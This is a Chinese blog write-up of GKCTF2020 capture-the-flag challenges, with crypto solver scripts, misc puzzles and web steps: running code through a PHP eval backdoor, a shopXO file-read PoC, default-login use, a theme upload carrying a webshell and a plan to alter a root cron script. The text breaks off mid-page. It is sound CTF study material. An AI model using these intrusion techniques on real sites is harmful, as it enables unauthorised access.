<!-- build time:Sat Jul 08 2023 19:17:09 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" href="https://blog.xcu.icu/rss.xml"><link rel="alternate" type="application/atom+xml" href="https://blog.xcu.icu/atom.xml"><link rel="alternate" type="application/json" href="https://blog.xcu.icu/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="GKCTF2020"><link rel="canonical" href="https://blog.xcu.icu/2023/04/05/GKCTF2020/"><title>GKCTF2020WP - WP | ClownのBlog =</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">GKCTF2020WP</h1><div class="meta"><span class="item" title="创建时间：2023-04-05 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-04-05T00:00:00+08:00">2023-04-05</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>19k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>18 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ClownのBlog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/120.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/91.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/98.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/145.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/88.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/68.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/WP/" itemprop="item" rel="index" title="分类于 WP"><span itemprop="name">WP</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://blog.xcu.icu/2023/04/05/GKCTF2020/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Clown"><meta itemprop="description" content=", 一个妄想全栈web小废物"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content=""></span><div class="body md" itemprop="articleBody"><h2 id="前言"><a class="anchor" href="#前言">#</a> 前言</h2><p>通过 buuctf 平台复现一些之前的赛题</p><h2 id="crypto"><a class="anchor" href="#crypto">#</a> Crypto</h2><h3 id="小学生的密码题"><a class="anchor" href="#小学生的密码题">#</a> 小学生的密码题</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304031046078.png" alt="image-20230403104605972"></p><p>题目描述就这么多，简单的仿射加密</p><pre><code class="language-perl">c=Ea,b(m)=am+b (mod 26)
m=Da,b(c)=a−1(c−b) (mod 26)
</code></pre><p>根据题目描述，可得 a=11，b=6</p><pre><code class="language-python">import base64
from gmpy2 import invert

m = 'welcylk'
a=11
b=6
c=''
k=26


for i in range(len(m)):
    c +=chr((((invert(a,k))*((ord(m[i])-97)-b))%26)+97)

print(c)
//sorcery
</code></pre><h3 id="汉字的秘密"><a class="anchor" href="#汉字的秘密">#</a> 汉字的秘密</h3><pre><code class="language-perl">王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫
</code></pre><p>当铺加密，很奇怪，当前汉字有多少笔画出头，就是转化成数字几，一一对应的</p><pre><code class="language-python">hz = &quot;田口由中人工大土士王夫井羊壮&quot;
sz = &quot;00123455567899&quot;

m = &quot;王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫&quot;
s = &quot;&quot;

for i in m:
    if i in hz:
        s += sz[hz.index(i)]
    else:
        s += ' '
# print(s)

ll = s.split(&quot; &quot;)
print(ll)
s = ''
for i in range(len(ll)):
    s += chr(int(ll[i]))
print(s)
#['69', '74', '62', '67', '118', '83', '72', '77', '86', '55', '71', '57', '82', '57', '64', '63', '51', '107']
#EJ&gt;CvSHMV7G9R9@?3k
</code></pre><p>这里转化后，发现转为字符后不规律，这里即将前几个字符对应 flag 转换，是一个变异凯撒</p><pre><code class="language-python">hz = &quot;田口由中人工大土士王夫井羊壮&quot;
sz = &quot;00123455567899&quot;

m = &quot;王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫&quot;
s = &quot;&quot;

for i in m:
    if i in hz:
        s += sz[hz.index(i)]
    else:
        s += ' '
# print(s)

ll = s.split(&quot; &quot;)
print(ll)
s = ''
for i in range(len(ll)):
    s += chr(int(ll[i])+i+1)
print(s.lower())
#['69', '74', '62', '67', '118', '83', '72', '77', '86', '55', '71', '57', '82', '57', '64', '63', '51', '107']
#flag&#123;you_are_good&#125;
</code></pre><h3 id="babycrypto"><a class="anchor" href="#babycrypto">#</a> babycrypto</h3><pre><code class="language-perl"># n:0xb119849bc4523e49c6c038a509a74cda628d4ca0e4d0f28e677d57f3c3c7d0d876ef07d7581fe05a060546fedd7d061d3bc70d679b6c5dd9bc66c5bdad8f2ef898b1e785496c4989daf716a1c89d5c174da494eee7061bcb6d52cafa337fc2a7bba42c918bbd3104dff62ecc9d3704a455a6ce282de0d8129e26c840734ffd302bec5f0a66e0e6d00b5c50fa57c546cff9d7e6a978db77997082b4cb927df9847dfffef55138cb946c62c9f09b968033745b5b6868338c64819a8e92a827265f9abd409359a9471d8c3a2631b80e5b462ba42336717700998ff38536c2436e24ac19228cd2d7a909ead1a8494ff6c3a7151e888e115b68cc6a7a8c6cf8a6c005L
# e:65537
# enc:1422566584480199878714663051468143513667934216213366733442059106529451931078271460363335887054199577950679102659270179475911101747625120544429262334214483688332111552004535828182425152965223599160129610990036911146029170033592055768983427904835395850414634659565092191460875900237711597421272312032796440948509724492027247376113218678183443222364531669985128032971256792532015051829041230203814090194611041172775368357197854451201260927117792277559690205342515437625417792867692280849139537687763919269337822899746924269847694138899165820004160319118749298031065800530869562704671435709578921901495688124042302500361
# p&gt;&gt;128&lt;&lt;128:0xe4e4b390c1d201dae2c00a4669c0865cc5767bc444f5d310f3cfc75872d96feb89e556972c99ae20753e3314240a52df5dccd076a47c6b5d11b531b92d901b2b512aeb0b263bbfd624fe3d52e5e238beeb581ebe012b2f176a4ffd1e0d2aa8c4d3a2656573b727d4d3136513a931428b00000000000000000000000000000000L
</code></pre><p>拿到题后就是上面的内容，看起来是 RSA，20 年的题了现在可以直接分解出来这个 n，直接常规接 RSA 即可</p><pre><code class="language-python">from gmpy2 import *
import libnum

n = 22356763374676421464625378500213339933332772809897207920729779273423674391734609826525432054721219700275907299132471518921609327317193522567659631757746842030241874692914098354564311806192080734895649520789778880115460999713973202684541940857690744940359412410680906226760273075221532248260114209496048785258860756023841150910290983974843412361701517438220974722832625030127395031631696995777436058406987465592189873785392136925593708921923255186282515777996509326779993612528103615281644689464568237409082282767318227236298791238683706176542426759149262625349498709445342710799386836175120162674849965878446213480453
e = 65537
p = 139091353059018128421744751525080056530307965918298875691299992775484064426591581456998968315582349027071987206340653988925923465225471661893944397744293391269274124345189028818977002600599732469824164218366399726233373069742839737062004061244787413638290767590029376062508897417109117189614458570241407458359
q = 160734387026849747944319274262095716650717626398118440194223452208652532694713113062084219512359968722796763029072117463281356654614167941930993838521563406258263299846297499190884495560744873319814150988520868951045961906000066805136724505347218275230562125457122462589771119429631727404626489634314291445667
c = 1422566584480199878714663051468143513667934216213366733442059106529451931078271460363335887054199577950679102659270179475911101747625120544429262334214483688332111552004535828182425152965223599160129610990036911146029170033592055768983427904835395850414634659565092191460875900237711597421272312032796440948509724492027247376113218678183443222364531669985128032971256792532015051829041230203814090194611041172775368357197854451201260927117792277559690205342515437625417792867692280849139537687763919269337822899746924269847694138899165820004160319118749298031065800530869562704671435709578921901495688124042302500361

N = (p-1)*(q-1)
d = invert(e,N)
m = pow(c,d,n)
print(libnum.n2s(int(m)))
//b'flag&#123;3d0914a1-1e97-4822-a745-c7e20c5179b9&#125;'
</code></pre><h3 id="backdoor"><a class="anchor" href="#backdoor">#</a> Backdoor</h3><p>这个题下载后给了三个文件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041526867.png" alt="image-20230404152640752"></p><p>题目名叫后门，给了一个公式<strong>弱素数生成公式</strong></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041527502.png" alt="image-20230404152753424"></p><p>flag.enc</p><pre><code class="language-perl">MDIxNDJhZjdjZTcwZmUwZGRhZTExNmJiN2U5NjI2MDI3NGVlOTI1MmE4Y2I1MjhlN2ZkZDI5ODA5YzJhNjAzMjcyN2MwNTUyNjEzM2FlNDYxMGVkOTQ0NTcyZmYxYWJmY2QwYjE3YWEyMmVmNDRhMg==
</code></pre><p>这个值解 base64 之后转 10 进制</p><pre><code class="language-perl">59021026099361835300364130419492050160728561849475961557849334226894382166900594987062873888829896738392942368210302613981217873768
</code></pre><p>pub.pem</p><pre><code class="language-perl">-----BEGIN PUBLIC KEY-----
MFMwDQYJKoZIhvcNAQEBBQADQgAwPwI4BXdHlrMB4cf0C0lFBWiLH94h9tX/zmNv
8WfYXjfXp7dJPjPBfUQXolyiSmcWMUzxhuFpltz8Z5sCAwEAAQ==
-----END PUBLIC KEY-----
</code></pre><p><span class="exturl" data-url="aHR0cDovL3Rhc2sucHk=">task.py</span></p><pre><code class="language-python">#!/usr/bin/python
from Crypto.Util.number import *
from Crypto.PublicKey import RSA
import gmpy2, binascii
import base64
from FLAG import flag

def rsa_encrypt(message):
    with open('./pub.pem' ,'r') as f:
        key = RSA.import_key(f.read())
    e = key.e
    n = key.n
    c = pow(bytes_to_long(flag), e, n)
 
    ciphertext = binascii.hexlify(long_to_bytes(c))
    return ciphertext

if __name__ == &quot;__main__&quot;:
    text = base64.b64encode(rsa_encrypt(flag))
    with open('flag.enc','wb') as f:
        f.write(text)
</code></pre><p>google 后发现是 CVE-2017-15361，<span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL2FzZWN1cml0eXNpdGUtd2hlbi1ib2ItbWV0LWFsaWNlL3NvLXdoYXQtd2FzLXRoZS1wcm9ibGVtLXdpdGgtdGhlLWVzdG9uaWFuLWlkLXN5c3RlbS1hbmQtdHBtcy0xZWYwMmE5YmRlN2Y=">那么爱沙尼亚身份证系统和 TPM 的问题是什么？弱素数生成器（和 RSA！ | 作者：比尔・布坎南教授 OBE |A 安全网站：当鲍勃遇见爱丽丝 | 中等 (medium.com)</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9hc2VjdXJpdHlzaXRlLmNvbS9lbmNyeXB0aW9uL2NvcHBlcg==">弱素数生成器 （RSALib） (asecuritysite.com)</span></p><p>其中 <em>k</em> 和 <em>a</em> 是破解时的未知整数。<em>M</em> 是前 n 个素数的乘法。</p><p>n 的素数因子 p 是由这个公式得出的</p><pre><code class="language-python">from Crypto.Util import number

k=3
vals=39
a=12
M=1

primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797, 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967, 971, 977, 983, 991, 997, 1009, 1013, 1019, 1021, 1031, 1033, 1039, 1049, 1051, 1061, 1063, 1069, 1087, 1091, 1093, 1097, 1103, 1109, 1117, 1123, 1129, 1151, 1153, 1163, 1171, 1181, 1187, 1193, 1201, 1213, 1217, 1223, 1229, 1231, 1237, 1249, 1259, 1277, 1279, 1283, 1289, 1291, 1297, 1301, 1303, 1307, 1319, 1321, 1327, 1361, 1367, 1373, 1381, 1399, 1409, 1423, 1427, 1429, 1433, 1439, 1447, 1451, 1453, 1459, 1471, 1481, 1483, 1487, 1489, 1493, 1499, 1511, 1523, 1531, 1543, 1549, 1553, 1559, 1567, 1571, 1579, 1583, 1597, 1601, 1607, 1609, 1613, 1619, 1621, 1627, 1637, 1657, 1663, 1667, 1669, 1693, 1697, 1699, 1709, 1721, 1723, 1733, 1741, 1747, 1753, 1759, 1777, 1783, 1787, 1789, 1801, 1811, 1823, 1831, 1847, 1861, 1867, 1871, 1873, 1877, 1879, 1889, 1901, 1907, 1913, 1931, 1933, 1949, 1951, 1973, 1979, 1987, 1993, 1997, 1999, 2003, 2011, 2017, 2027, 2029, 2039, 2053, 2063, 2069, 2081, 2083, 2087, 2089, 2099, 2111, 2113, 2129, 2131, 2137, 2141, 2143, 2153, 2161, 2179, 2203, 2207, 2213, 2221, 2237, 2239, 2243, 2251, 2267, 2269, 2273, 2281, 2287, 2293, 2297, 2309, 2311, 2333, 2339, 2341, 2347, 2351, 2357, 2371, 2377, 2381, 2383, 2389, 2393, 2399, 2411, 2417, 2423, 2437, 2441, 2447, 2459, 2467, 2473, 2477, 2503, 2521, 2531, 2539, 2543, 2549, 2551, 2557, 2579, 2591, 2593, 2609, 2617, 2621, 2633, 2647, 2657, 2659, 2663, 2671, 2677, 2683, 2687, 2689, 2693, 2699, 2707, 2711, 2713, 2719, 2729, 2731, 2741, 2749, 2753, 2767, 2777, 2789, 2791, 2797, 2801, 2803, 2819, 2833, 2837, 2843, 2851, 2857, 2861, 2879, 2887, 2897, 2903, 2909, 2917, 2927, 2939, 2953, 2957, 2963, 2969, 2971, 2999]

for x in range(0, vals):
    M=M*primes[x]

p=k*M+(65537**a %M)
print('k=',k)
print('a=',a)
print('Number of prime numbers used=',vals)
print('======')

print('M=',M)
print('\nPrime=',p)

isp = number.isPrime(p)
if (isp==1):
	print('Value is prime')
else:
	print('Value is not prime')
</code></pre><p>通过 pub.pwm 来获取 e 和 n</p><pre><code class="language-python">with open('./pub.pem' ,'r') as f:
    key = RSA.import_key(f.read())
    e = key.e
    n = key.n
#e=65535
#n=15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739
</code></pre><p>这里的 n 是 134 位，预估 p 的位数不超过 134/2=67 位，M 代表前 x 项素数的乘积， x 的可选值有 5，16，39，71，80，126。在参数 k 与 a 取值不大的情况下，选取不同的 x 值，得到的 p 的位数不同。</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041614575.png" alt="image-20230404161441453"></p><p>这里爆破一下求得 pq</p><pre><code>import gmpy2
M=962947420735983927056946215901134429196419130606213075415963491270
n=15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739

for k in range(100):
	for a in range(100):
		p=k*M+(65537**a %M)
		if n%p==0:
			print('k=',k)
			print('a=',a)
			print('Prime=',p)
			isp = gmpy2.is_prime(p)
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041616242.png" alt="image-20230404161647184"></p><pre><code class="language-python">from gmpy2 import *
import libnum

n = 15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739
e = 65537
p = 3386619977051114637303328519173627165817832179845212640767197001941
q = 4582433561127855310805294456657993281782662645116543024537051682479
c = int(&quot;02142af7ce70fe0ddae116bb7e96260274ee9252a8cb528e7fdd29809c2a6032727c05526133ae4610ed944572ff1abfcd0b17aa22ef44a2&quot;,16)

N = (p-1)*(q-1)
d = invert(e,N)
m = pow(c,d,n)
# print(d)
print(libnum.n2s(int(m)))
#b'flag&#123;760958c9-cca9-458b-9cbe-ea07aa1668e4&#125;'
</code></pre><h2 id="misc"><a class="anchor" href="#misc">#</a> Misc</h2><h3 id="pokémon"><a class="anchor" href="#pokémon">#</a> Pokémon</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZW11bGF0b3Item9uZS5jb20vZG9jLnBocC9nYmEvdmJveWFkdmFuY2UuaHRtbA==">Visual Boy Advance (emulator-zone.com)</span></p><p>玩这个游戏，到 103 号路口就行，纯娱乐</p><h3 id="code-obfuscation"><a class="anchor" href="#code-obfuscation">#</a> code obfuscation</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041752507.png" alt="image-20230404175252420"></p><p>将图片拉伸一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041753123.png" alt="image-20230404175317080"></p><p>补一下这个图</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041756324.png" alt="image-20230404175641276"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041757333.png" alt="image-20230404175700284"></p><p>这里用 binwalk -e 分解后得到一个 rar</p><p>将上面 gkctf 进行 base58 编码后可以打开压缩包</p><p>打开后图片内容</p><pre><code class="language-perl">$Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce
$Ai$An$At$Bk$Am$Aa$Ai$Bs$Bt$Cn
$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb
$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb
$Cp
</code></pre><p>1 文件内容</p><pre><code class="language-perl">eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!''.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return'\\w+'&#125;;c=1;&#125;;while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;&#125;('15 n 14 a b c d e f g h i j k l m n o p q r s t u v w x y z 10 11 17=&quot;n&quot;12 15 n 14 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 10 11 17=&quot;n&quot;12 13=0 15 n 14 a b c d e f g h i j 10 11 16=&quot;n&quot;13=$((13+1))12 1g(&quot;1f=\' \';1e=\'&quot;\';16=\'#\';1j=\'(\';1i=\')\';1h=\'.\';1a=\';\';19=\'&lt;\';18=\'&gt;\';1d=\'1c\';1b=\'&#123;\';1k=\'&#125;\';1t=\'0\';1u=\'1\';1s=\'2\';1r=\'3\';1n=\'4\';1m=\'5\';1l=\'6\';1q=\'7\';1p=\'8\';1o=\'9\';&quot;)',62,93,'||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||do|eval|done|num|in|for|Bn|An|Ce|Cc|Cb|Cn|_|Cl|Bm|Bk|alert|By|Bt|Bs|Cp|Dg|Df|De|Dj|Di|Dh|Dd|Dc|Da|Db'.split('|'),0,&#123;&#125;))

</code></pre><p>这里用的是网上找到的脚本</p><pre><code class="language-python">import string
s = &quot;$Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce$Ai$An$At$Bk$Am$Aa$Ai$An$Bs$Bt$Cn$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb$Cp&quot;
ll = s.split('$')
list1 = ['Bk','Bm','Bn','Bs','Bt','By','Cb','Cc','Ce','Cl','Cn','Cp',
'Da','Db','Dc','Dd','De','Df','Dg','Dh','Di','Dj']
list2 = [' ','&quot;','#','(',')','.','','&lt;','&gt;','_','&#123;','&#125;','0','1','2','3','4','5','6','7','8','9']
list3 = []
list4 = []
s = string.ascii_lowercase
for i in s:
	list3.append('A%s'%i)
	list4.append(i)
#print(list3,'\n',list4)

t = ''
for i in range(0,len(ll)):
	for j in range(0,len(list1)):
		if ll[i]==list1[j]:
			t += list2[j]
	for k in range(0,len(list3)):
		if ll[i]==list3[k]:
			t +=list4[k]
print(t)
#include &lt;stdio.h&gt;int main()&#123;print(&quot;w3lc0me_4o_9kct5&quot;)return 0&#125;
</code></pre><h3 id="harley-quinn"><a class="anchor" href="#harley-quinn">#</a> Harley Quinn</h3><p>这题放了两个 hint，看起来当时开始的时候做出来的人还是不多的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304042357129.png" alt="image-20230404235705038"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304042357970.png" alt="image-20230404235716937"></p><p>音频到结尾部分，有电话音的声音，用工具 dtmf2num 进行破解：</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050010205.png" alt="image-20230405001023160"></p><p>#22283334447777338866#</p><p>对应 9 建</p><pre><code class="language-perl">ctfisfun
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050021579.png" alt="image-20230405002121528"></p><p>根据提示使用 FreeFileCamouflage 破解</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050021405.png" alt="image-20230405002156367"></p><h3 id="sail-a-boat-down-the-river"><a class="anchor" href="#sail-a-boat-down-the-river">#</a> Sail a boat down the river</h3><p>三解，三个 hint，当时的题还是很绕的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050024187.png" alt="image-20230405002442142"></p><pre><code class="language-perl">Hint:
闪烁的光芒
是一行不是一列
加密方式很常见
</code></pre><p>根据提示在 <code>118帧-130帧</code> 、 <code>200帧-208帧</code> 、 <code>320帧-334帧</code> 、 <code>410帧-418帧</code> 刷卡器出现闪光，摩斯密码</p><pre><code>-.-- .-- ---.. --.
</code></pre><p>解出得 yw8g</p><p>在 15 秒看到一张二维码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050032246.png" alt="image-20230405003255656"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050035420.png" alt="image-20230405003538176"></p><p><span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXR5Z3QwTm1fRzVmVGZWRmxneFZjclE=">https://pan.baidu.com/s/1tygt0Nm_G5fTfVFlgxVcrQ</span></p><p>输入上面得到的密码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050036502.png" alt="image-20230405003637459"></p><p>密钥解熟读，然后根据排序即可得到： <code>52693795149137</code> <span class="exturl" data-url="aHR0cDovL3huLS1HRzBrYy02bzZocjY4Y2xnaGs0NmgudGY=">解密得到 GG0kc.tf</span></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050040420.png" alt="image-20230405004030369"></p><p>使用 <code>Overture</code> 打开得到 flag</p><h2 id="web"><a class="anchor" href="#web">#</a> Web</h2><h3 id="checkin"><a class="anchor" href="#checkin">#</a> CheckIN</h3><pre><code class="language-php">&lt;title&gt;Check_In&lt;/title&gt;
&lt;?php 
highlight_file(__FILE__);
class ClassName
&#123;
        public $code = null;
        public $decode = null;
        function __construct()
        &#123;
                $this-&gt;code = @$this-&gt;x()['Ginkgo'];
                $this-&gt;decode = @base64_decode( $this-&gt;code );
                @Eval($this-&gt;decode);
        &#125;

        public function x()
        &#123;
                return $_REQUEST;
        &#125;
&#125;
new ClassName();
</code></pre><p>这里可以看到，源码很简单，接受参数，base64 解码后 eval 执行，先尝试 phpinfo ()</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050051333.png" alt="image-20230405005151284"></p><p>能够正常执行，但是看到在环境变量中过滤了很多函数</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050052378.png" alt="image-20230405005239337"></p><p>没有过滤 eval 函数，尝试构造木马用蚁剑连接后，发现不能正常运行命令，使用插件绕过</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050058842.png" alt="image-20230405005812789"></p><h3 id="老八小超市儿"><a class="anchor" href="#老八小超市儿">#</a> 老八小超市儿</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051506808.png" alt="image-20230405150623656"></p><p>发现是 shopXO 电商系统，基于 thinkphp 开发的，去搜 CVE<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ4OTg1NzgwL2FydGljbGUvZGV0YWlscy8xMjIyMTgwOTE="> (71 条消息) shopxo 文件读取（CNVD-2021-15822）_xzhome 的博客 - CSDN 博客</span></p><p>这里直接用 poc 读取跟目录下面的 flag</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051513091.png" alt="image-20230405151307037"></p><p>提示 flag 在 root 下面尝试读取发现 return 500 估计是权限问题，看来还得找别的 cve，看了下版本是 1.8</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051508840.png" alt="image-20230405150840800"></p><p><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8yMDk5NDAw">渗透测试 | shopxo 后台全版本获取 shell 复现 - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span> 这里看到需要先登录，尝试发现没有改默认密码</p><p>这里直接搜索主题</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051521200.png" alt="image-20230405152129091"></p><p>下载后添加一句话木马</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051534023.png" alt="image-20230405153407978"></p><p>再上传回去</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051535230.png" alt="image-20230405153555190"></p><p>这里直接添加</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051541059.png" alt="image-20230405154104996"></p><p>用蚂蚁剑连接上后确实访问不了这个 root 目录</p><p><img data-src="C:%5CUsers%5C%E9%99%8C%E8%B7%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230405154225020.png" alt="image-20230405154225020"></p><p>看到根目录还有一个 hint</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051543047.png" alt="image-20230405154340012"></p><p><span class="exturl" data-url="aHR0cDovL3huLS1hdXRvLXBtOWZsOGZveDNoLnNo">又看到 auto.sh</span></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051544829.png" alt="image-20230405154429791"></p><p>没 60 秒刷新一次，那修改一下这个脚本就可以了</p><p><img 